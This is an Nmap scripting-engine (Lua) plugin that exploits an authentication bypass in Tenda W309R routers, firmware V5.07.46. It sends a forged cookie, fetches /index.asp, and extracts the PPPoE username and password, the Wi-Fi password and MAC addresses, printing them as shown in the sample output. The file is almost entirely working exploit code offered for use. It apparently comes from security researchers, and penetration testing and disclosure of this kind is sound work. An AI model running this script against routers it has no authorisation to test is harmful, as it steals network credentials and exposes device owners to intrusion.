local nmap = require "nmap"
local shortport = require "shortport"
local table = require "table"
local http = require "http"
local stdnse = require 'stdnse'

description = [[
Tenda W309R allows an attacker to access the configuration detailed with no authentication.
Firmware Tested : V5.07.46

Thanks & Credits : Mahesh Gavkar, Samandeep Singh (@samanL33T), Amit Ghadigaonkar
]]

---
--@usage
-- nmap host --script http-tenda --script-args user=tenda
--80/tcp open  http
--| http-tenda:
--|   PPPoE Username : home_user
--|   PPPoE Password : 12345
--|   Wireless Password : 12345678
--|   Clone MAC : AA:AA:AA:AA:AA:AA
--|_  Face MAC : BB:BB:BB:BB:BB:BB
---

author = "Sanoop Thomas a.k.a @s4n7h0"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe","discovery"}

portrule = shortport.http

function formatme(line)
	local start = string.find(line, '"')
	local stop = string.find(line, '";')
	return line:sub(start+1,stop-1)
end

function fetchinfo(r)
	local tenda = {}
	local param,value
	for line in r.body:gmatch("[^\r\n]+") do
		if(line:match("def_PUN = "))then
			table.insert(tenda,"PPPoE Username : " .. formatme(line))
        end
		if(line:match("def_PPW ="))then
			table.insert(tenda,"PPPoE Password : " .. formatme(line))
        end
		if(line:match("def_wirelesspassword ="))then
			table.insert(tenda,"Wireless Password : " .. formatme(line))
        end
		if(line:match("var cln_MAC ="))then
			
			table.insert(tenda,"Clone MAC : " .. formatme(line))
        end
		if(line:match("var fac_MAC = "))then
			table.insert(tenda,"Face MAC : " .. formatme(line))
        end
    end
	return tenda
end


action = function(host, port)
	local user = "admin"
	local r
	local config = {}

	if(nmap.registry.args.user) then
		user = nmap.registry.args.user
	end
	
	local header = {
        cookies = user		
	}	
	r = http.get(host,port,'/index.asp',header)
    return stdnse.format_output(true, fetchinfo(r)) 
end
